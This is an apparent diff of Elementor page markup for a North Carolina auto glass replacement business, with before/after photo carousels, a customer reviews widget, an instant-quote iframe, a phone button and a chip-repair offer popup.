+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-697 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-697 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-697 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-697 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="697" class="elementor elementor-697" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P5b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P5a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-689 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-689 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-689 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-689 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="689" class="elementor elementor-689" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P3b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P3a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-629 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-629 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-629 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-629 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="629" class="elementor elementor-629" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P2b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P2a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-625 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-625 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-625 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="625" class="elementor elementor-625" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P1a.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P1b.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+									</div>
+
+			
+			
+					</div>
+						</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-09ce646 e-flex e-con-boxed e-con e-parent" data-id="09ce646" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-0e5584d e-con-full e-flex e-con e-child" data-id="0e5584d" data-element_type="container" data-e-type="container">
+		<div class="elementor-element elementor-element-e19723c e-con-full e-flex e-con e-child" data-id="e19723c" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-39c8a7a elementor-invisible elementor-widget elementor-widget-ucaddon_side_border_heading" data-id="39c8a7a" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="ucaddon_side_border_heading.default">
+				<div class="elementor-widget-container">
+					
+<!-- start Side Line Heading -->
+<style>/* widget: Side Line Heading */
+
+#uc_side_border_heading_elementor_39c8a7a
+{
+  display:flex;
+}
+
+#uc_side_border_heading_elementor_39c8a7a .side_border_heading_title
+{
+  color:black;
+}
+
+#uc_side_border_heading_elementor_39c8a7a .side_border_heading_subtitle
+{
+  line-height:1.5em;
+  color:gray;
+}
+#uc_side_border_heading_elementor_39c8a7a .side_border_heading_line_holder{
+flex-shrink: 0;
+}
+
+#uc_side_border_heading_elementor_39c8a7a .side_border_heading_line_spacer{
+flex-shrink: 0;
+}
+
+</style>
+
+<div id="uc_side_border_heading_elementor_39c8a7a">
+  <div class="side_border_heading_line_holder"><div class="side_border_heading_line" style="background-color:#168410;"></div></div>
+  <div class="side_border_heading_line_spacer"></div>
+  <div>
+    <div class="side_border_heading_title"><span  class="uc_style_side_border_heading_elementor_title" style="color:#168410;">RATED 5-STARS BY DRIVERS LIKE YOU</span></div>
+    <div class="side_border_heading_subtitle"></div>
+  </div>
+</div>
+<!-- end Side Line Heading -->				</div>
+				</div>
+				<div class="elementor-element elementor-element-4321b96 elementor-widget elementor-widget-heading" data-id="4321b96" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Trusted by Hundreds of Satisfied Customers</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-936b482 elementor-invisible elementor-widget elementor-widget-text-editor" data-id="936b482" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>We’ve built our reputation by delivering top-tier auto glass replacements with unmatched customer care. But don’t just take our word for it — read what real customers have to say about their experience with our team!</p>								</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-fffc3b1 e-con-full e-flex e-con e-child" data-id="fffc3b1" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-313854b bdt-reveal-preload bdt-reveal-effects-yes elementor-widget elementor-widget-image" data-id="313854b" data-element_type="widget" data-e-type="widget" data-settings="{&quot;element_pack_reveal_effects_enable&quot;:&quot;yes&quot;,&quot;element_pack_reveal_effects_color&quot;:&quot;#168410&quot;,&quot;element_pack_ris_enable&quot;:&quot;yes&quot;,&quot;element_pack_reveal_effects_direction&quot;:&quot;lr&quot;,&quot;element_pack_reveal_effects_easing&quot;:&quot;easeOutQuint&quot;,&quot;element_pack_reveal_effects_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:5,&quot;sizes&quot;:[]},&quot;element_pack_ris_x&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_y&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_blur&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_opacity&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_scale_x&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" style="--ep-reveal-effects-init: 0;" data-nnn="#168410" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img fetchpriority="high" decoding="async" width="429" height="600" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/Happy-Girl-In-Car.jpeg" class="attachment-large size-large wp-image-1375" alt="" srcset="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/Happy-Girl-In-Car.jpeg 429w, https://firstclassautoglassnc.com/wp-content/uploads/2024/05/Happy-Girl-In-Car-215x300.jpeg 215w" sizes="(max-width: 429px) 100vw, 429px" />															</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-4a472f0 e-con-full e-flex e-con e-child" data-id="4a472f0" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-733fd21 bdt-reveal-preload bdt-reveal-effects-yes elementor-widget elementor-widget-image" data-id="733fd21" data-element_type="widget" data-e-type="widget" data-settings="{&quot;element_pack_reveal_effects_enable&quot;:&quot;yes&quot;,&quot;element_pack_reveal_effects_direction&quot;:&quot;rl&quot;,&quot;element_pack_reveal_effects_color&quot;:&quot;#0234B2&quot;,&quot;element_pack_ris_enable&quot;:&quot;yes&quot;,&quot;element_pack_reveal_effects_easing&quot;:&quot;easeOutQuint&quot;,&quot;element_pack_reveal_effects_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:5,&quot;sizes&quot;:[]},&quot;element_pack_ris_x&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_y&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_blur&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_opacity&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_ris_scale_x&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" style="--ep-reveal-effects-init: 0;" data-nnn="#0234B2" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="552" height="600" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/happy-family-showing-thumbs-up-at-driver-seat.jpeg" class="attachment-large size-large wp-image-1381" alt="" srcset="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/happy-family-showing-thumbs-up-at-driver-seat.jpeg 552w, https://firstclassautoglassnc.com/wp-content/uploads/2024/05/happy-family-showing-thumbs-up-at-driver-seat-276x300.jpeg 276w" sizes="(max-width: 552px) 100vw, 552px" />															</div>
+				</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-0714467 e-con-full e-flex e-con e-child" data-id="0714467" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-46fec80 elementor-invisible elementor-widget elementor-widget-html" data-id="46fec80" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<script src="https://static.elfsight.com/platform/platform.js" data-use-service-core defer></script>
+<div class="elfsight-app-441cf65e-bc27-4401-aac0-e4d0044eddd7" data-elfsight-app-lazy></div>				</div>
+				</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-d5763da e-flex e-con-boxed e-con e-parent" data-id="d5763da" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-ceb9374 e-con-full bdt-backdrop-filter-yes e-flex bdt-filter-backdrop e-con e-child" data-id="ceb9374" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-162ca77 elementor-widget elementor-widget-heading" data-id="162ca77" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Get An Instant Auto Glass Replacement Quote</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-134d16a elementor-widget elementor-widget-html" data-id="134d16a" data-element_type="widget" data-e-type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<iframe width="560" height="800" src="//app.omegaedi.com/quoter/?folder=firstclassagnc&smart=true
+" frameborder="0"></iframe>
+				</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-33d57c8 e-con-full bdt-backdrop-filter-yes e-flex bdt-filter-backdrop e-con e-child" data-id="33d57c8" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-92417d6 elementor-invisible elementor-widget elementor-widget-ucaddon_side_border_heading" data-id="92417d6" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="ucaddon_side_border_heading.default">
+				<div class="elementor-widget-container">
+					
+<!-- start Side Line Heading -->
+<style>/* widget: Side Line Heading */
+
+#uc_side_border_heading_elementor_92417d6
+{
+  display:flex;
+}
+
+#uc_side_border_heading_elementor_92417d6 .side_border_heading_title
+{
+  color:black;
+}
+
+#uc_side_border_heading_elementor_92417d6 .side_border_heading_subtitle
+{
+  line-height:1.5em;
+  color:gray;
+}
+#uc_side_border_heading_elementor_92417d6 .side_border_heading_line_holder{
+flex-shrink: 0;
+}
+
+#uc_side_border_heading_elementor_92417d6 .side_border_heading_line_spacer{
+flex-shrink: 0;
+}
+
+</style>
+
+<div id="uc_side_border_heading_elementor_92417d6">
+  <div class="side_border_heading_line_holder"><div class="side_border_heading_line" style="background-color:#45D300;"></div></div>
+  <div class="side_border_heading_line_spacer"></div>
+  <div>
+    <div class="side_border_heading_title"><span  class="uc_style_side_border_heading_elementor_title" style="color:#45D300;">DON'T WAIT. DRIVER SAFER TODAY.</span></div>
+    <div class="side_border_heading_subtitle"></div>
+  </div>
+</div>
+<!-- end Side Line Heading -->				</div>
+				</div>
+				<div class="elementor-element elementor-element-e8f198d elementor-widget elementor-widget-heading" data-id="e8f198d" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Your Auto Glass Replacement <br> Done Right!</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-232189e elementor-invisible elementor-widget elementor-widget-text-editor" data-id="232189e" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Broken or missing auto glass leaves your vehicle exposed — don’t wait to get it fixed. Our certified technicians provide fast, mobile replacement for all types of auto glass using OEM-quality materials. We handle insurance paperwork and back every job with a lifetime warranty.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-c5bf0a1 elementor-invisible elementor-widget elementor-widget-button" data-id="c5bf0a1" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-md" href="tel:9802428339">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">(980) 242-8339</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/hello-elementor/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+		<div data-elementor-type="popup" data-elementor-id="2046" class="elementor elementor-2046 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;fadeInUp&quot;,&quot;exit_animation&quot;:&quot;fadeInUp&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_width&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_width_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_width_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;element_pack_global_tooltip_padding&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_padding_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_padding_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;element_pack_global_tooltip_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-adb1e99 e-flex e-con-boxed e-con e-parent" data-id="adb1e99" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-42d900f elementor-widget elementor-widget-heading" data-id="42d900f" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Get Your Instant Auto Glass Quote</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-2ae6bc4 elementor-widget elementor-widget-bdt-advanced-divider" data-id="2ae6bc4" data-element_type="widget" data-e-type="widget" data-widget_type="bdt-advanced-divider.default">
+				<div class="elementor-widget-container">
+							<div class="bdt-ep-advanced-divider" data-settings="{&quot;animation&quot;:true}">
+
+							<img src="https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/images/divider/line.svg" alt="advanced divider" class="bdt-animation-stroke ep_square">
+			
+		</div>
+
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-434de8f elementor-widget elementor-widget-text-editor" data-id="434de8f" data-element_type="widget" data-e-type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Need a quick auto glass quote? Enter your vehicle details.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-3474fce elementor-widget elementor-widget-heading" data-id="3474fce" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Flat-Rate Chip Repair – Just $80</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-8abe765 elementor-widget elementor-widget-text-editor" data-id="8abe765" data-element_type="widget" data-e-type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Whether you have one, two, or even a few chips. Beyond that, replacement may be the best option.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-7768314 elementor-widget elementor-widget-html" data-id="7768314" data-element_type="widget" data-e-type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<iframe width="560" height="800" src="//app.omegaedi.com/quoter/?folder=firstclassagnc&smart=true
+" frameborder="0"></iframe>
+				</div>
+				</div>
+					</div>
+				</div>
+				</div>
+					<script>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
